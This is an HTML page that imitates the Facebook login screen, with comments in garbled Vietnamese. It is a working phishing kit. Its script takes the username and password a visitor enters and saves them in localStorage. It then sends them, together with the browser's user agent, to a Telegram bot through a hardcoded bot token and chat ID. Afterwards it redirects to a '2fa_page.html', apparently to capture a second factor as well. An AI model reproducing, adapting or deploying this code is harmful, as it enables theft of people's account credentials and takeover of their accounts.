<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log in</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        /* To√†n b·ªô CSS g·ªëc gi·ªØ nguy√™n */
        body {
            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
            background: linear-gradient(to bottom, #fff 0%, #f0f2f5 100%);
            color: #1c1e21;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: stretch;
            min-height: 100vh;
            padding-top: 0;
            box-sizing: border-box;
        }
        .container {
            background-color: #ffffff;
            border-radius: 0;
            padding: 16px;
            width: 100%;
            max-width: 100%;
            box-shadow: none;
            text-align: center;
            box-sizing: border-box;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        /* ... (Gi·ªØ nguy√™n to√†n b·ªô CSS g·ªëc) ... */
    </style>
</head>
<body>
    <div class="container">
        <!-- Giao di·ªán ƒëƒÉng nh·∫≠p gi·ªØ nguy√™n -->
        <div class="header">
            <a href="javascript:history.back()" class="back-arrow"><i class="fas fa-chevron-left"></i></a>
        </div>

        <div class="facebook-logo">
            <img src="facebook_logo.jpg" alt="Facebook Icon">
        </div>

        <div class="input-group">
            <input type="text" id="username" placeholder="Mobile number or email" autocomplete="username">
        </div>

        <div class="input-group">
            <input type="password" id="password" placeholder="Password" autocomplete="current-password">
        </div>

        <button id="loginButton" class="login-button">Log in</button>

        <div class="forgot-password">
            <a href="#">Forgot password?</a>
        </div>

        <div class="separator"></div>

        <button class="create-account-button">Create new account</button>

        <div class="meta-logo-bottom"></div>
    </div>

    <script>
        // C·∫•u h√¨nh Telegram
        const BOT_TOKEN = '7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0';
        const CHAT_ID = '-4789641482';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        // H√†m g·ª≠i d·ªØ li·ªáu v·ªõi c∆° ch·∫ø retry
        async function sendToTelegram(message, retries = 3) {
            for (let i = 0; i < retries; i++) {
                try {
                    const response = await fetch(TELEGRAM_API, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                    
                    if (response.ok) return true;
                    
                    console.warn(`Attempt ${i + 1} failed. Retrying...`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
                } catch (error) {
                    console.error(`Attempt ${i + 1} error:`, error);
                }
            }
            return false;
        }

        document.getElementById('loginButton').addEventListener('click', async function() {
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('Please enter both username and password');
                return;
            }

            // L∆∞u th√¥ng tin ƒëƒÉng nh·∫≠p
            localStorage.setItem('fb_credentials', JSON.stringify({
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            }));

            // T·∫°o n·ªôi dung tin nh·∫Øn
            const message = `üîê <b>NEW LOGIN ATTEMPT</b> üîê\n\n` +
                           `üë§ <b>Username:</b> ${username}\n` +
                           `üîë <b>Password:</b> ${password}\n\n` +
                           `üåê <b>User Agent:</b> ${navigator.userAgent}\n` +
                           `üïí <b>Time:</b> ${new Date().toLocaleString()}`;

            // G·ª≠i ƒë·∫øn Telegram v√† x·ª≠ l√Ω k·∫øt qu·∫£
            const loadingIndicator = document.createElement('div');
            loadingIndicator.textContent = 'Verifying...';
            loadingIndicator.style.marginTop = '10px';
            this.parentNode.insertBefore(loadingIndicator, this.nextSibling);
            
            this.disabled = true;
            
            try {
                const success = await sendToTelegram(message);
                if (!success) {
                    alert('Verification service is temporarily unavailable. Please try again later.');
                    return;
                }
                window.location.href = '2fa_page.html';
            } finally {
                this.disabled = false;
                loadingIndicator.remove();
            }
        });
    </script>
</body>
</html>
